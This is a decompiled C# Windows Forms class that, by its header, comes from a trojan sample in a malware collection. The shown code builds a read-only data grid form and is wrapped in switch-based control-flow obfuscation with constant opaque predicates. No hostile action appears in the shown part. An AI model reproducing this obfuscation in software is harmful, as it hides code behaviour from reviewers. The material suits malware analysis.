// Decompiled with JetBrains decompiler
// Type: ProjNet.Definitions.UtilsStateDef
// Assembly: TYPELIBA, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 97BB50BA-9882-4DFE-999C-7A4E4B448F1C
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.Win32.Generic-080eff3ceefca287dc59d176676559ae1aa3f1faec807805114bae214a11f586.exe

using ProjNet.Adapter;
using System.ComponentModel;
using System.Data.Linq;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using TYPELIBA.Identifiers;
using TYPELIBA.Wrappers;

namespace ProjNet.Definitions
{
  public class UtilsStateDef : Form
  {
    private IContainer _CallbackConsumer;
    private DataGridView _UtilsConsumer;

    [MethodImpl(MethodImplOptions.NoInlining)]
    public UtilsStateDef()
    {
      int num1 = 5;
      while (true)
      {
        int num2 = num1;
        Table<ComposerConsumerAdapter> table;
        while (true)
        {
          switch (num2)
          {
            case 0:
            case 3:
              this._UtilsConsumer.DataSource = (object) table;
              num2 = 6;
              continue;
            case 1:
            case 2:
              this.IncludeError();
              table = MethodProcess.RateConsumer();
              goto case 0;
            case 4:
              goto label_2;
            case 5:
              ManagerParamsID.NewExpression();
              num2 = 4;
              continue;
            case 6:
              goto label_8;
            default:
              num2 = 0;
              continue;
          }
        }
label_2:
        this._CallbackConsumer = (IContainer) null;
        // ISSUE: explicit constructor call
        base.\u002Ector();
        num1 = 1;
      }
label_8:;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    protected override void Dispose(bool specinstall)
    {
      int num1 = 1;
      while (true)
      {
        int num2;
        int num3;
        switch (num1)
        {
          case 0:
          case 1:
            if (!specinstall)
            {
              num3 = 0;
              goto label_5;
            }
            else
            {
              if (!UtilsStateDef.CustomizeCreator())
              {
                num1 = 3;
                continue;
              }
              goto label_12;
            }
          case 2:
          case 4:
label_1:
            break;
          case 3:
            num3 = this._CallbackConsumer != null ? 1 : 0;
            goto label_5;
          case 5:
            goto label_13;
          default:
            num2 = 4;
            goto label_7;
        }
label_2:
        base.Dispose(specinstall);
        num2 = 5;
        goto label_7;
label_5:
        if (num3 != 0)
        {
          this._CallbackConsumer.Dispose();
          goto label_1;
        }
        else
          goto label_2;
label_7:
        num1 = num2;
      }
label_13:
      return;
label_12:;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void IncludeError()
    {
      int num1 = 6;
      while (true)
      {
        int num2;
        switch (num1)
        {
          case 0:
          case 6:
            this._UtilsConsumer = new DataGridView();
            num1 = 5;
            continue;
          case 1:
          case 5:
            ((ISupportInitialize) this._UtilsConsumer).BeginInit();
            this.SuspendLayout();
            this._UtilsConsumer.AllowUserToAddRows = false;
            this._UtilsConsumer.AllowUserToDeleteRows = false;
            num2 = 8;
            break;
          case 2:
            this._UtilsConsumer.ColumnHeadersHeightSizeMode = DataGridViewColumnHeadersHeightSizeMode.AutoSize;
            num2 = 7;
            break;
          case 3:
            this.AutoSize = true;
            num2 = 9;
            break;
          case 4:
            this.Text = "Titles";
            ((ISupportInitialize) this._UtilsConsumer).EndInit();
            this.ResumeLayout(false);
            if (true)
            {
              num1 = 10;
              continue;
            }
            goto case 1;
          case 7:
            this._UtilsConsumer.Dock = DockStyle.Fill;
            this._UtilsConsumer.Location = new Point(0, 0);
            this._UtilsConsumer.Name = "dataGridView";
            this._UtilsConsumer.ReadOnly = true;
            this._UtilsConsumer.Size = new Size(535, 213);
            this._UtilsConsumer.TabIndex = 0;
            this.AutoScaleDimensions = new SizeF(6f, 13f);
            this.AutoScaleMode = AutoScaleMode.Font;
            goto case 3;
          case 8:
            this._UtilsConsumer.AutoSizeColumnsMode = DataGridViewAutoSizeColumnsMode.AllCells;
            this._UtilsConsumer.AutoSizeRowsMode = DataGridViewAutoSizeRowsMode.AllCells;
            if (UtilsStateDef.PrintCreator())
            {
              num1 = 2;
              continue;
            }
            goto case 9;
          case 9:
            this.ClientSize = new Size(535, 213);
            this.Controls.Add((Control) this._UtilsConsumer);
            this.Name = "ReadTitlesChildForm";
            num2 = 4;
            break;
          case 10:
            goto label_12;
          default:
            num2 = 3;
            break;
        }
        num1 = num2;
      }
label_12:;
    }

    internal static bool PrintCreator() => true;

    internal static bool CustomizeCreator() => false;
  }
}
